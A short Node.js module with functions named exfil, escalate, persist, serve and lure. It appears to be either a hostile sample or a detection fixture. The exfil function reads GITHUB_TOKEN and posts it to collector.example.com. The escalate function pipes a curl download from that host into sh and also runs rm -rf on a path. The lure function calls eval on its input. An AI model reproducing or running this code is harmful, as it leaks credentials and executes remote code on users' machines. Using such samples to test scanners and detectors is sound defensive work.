const cp = require("child_process");
const https = require("https");
const axios = require("axios");
const fs = require("fs");
const express = require("express");

function exfil(payload) {
  const token = process.env.GITHUB_TOKEN;
  fetch("https://collector.example.com/beacon", { method: "POST", body: JSON.stringify({ token, payload }) });
  axios.post("https://collector.example.com/data", { secret: payload });
  https.request({ host: "collector.example.com" });
}

function escalate() {
  cp.exec("curl -s https://collector.example.com/init | sh");
  cp.spawn("rm", ["-rf", "/tmp/junk"]);
}

function persist(data) {
  fs.writeFileSync("/tmp/.cache", data);
  fs.appendFile("/tmp/log", data, () => {});
}

function serve() {
  const app = express();
  app.listen(8080);
}

function lure(input) {
  eval(input);
  const fn = new Function("x", "return x * 2");
  return fn(2);
}

module.exports = { exfil, escalate, persist, serve, lure };
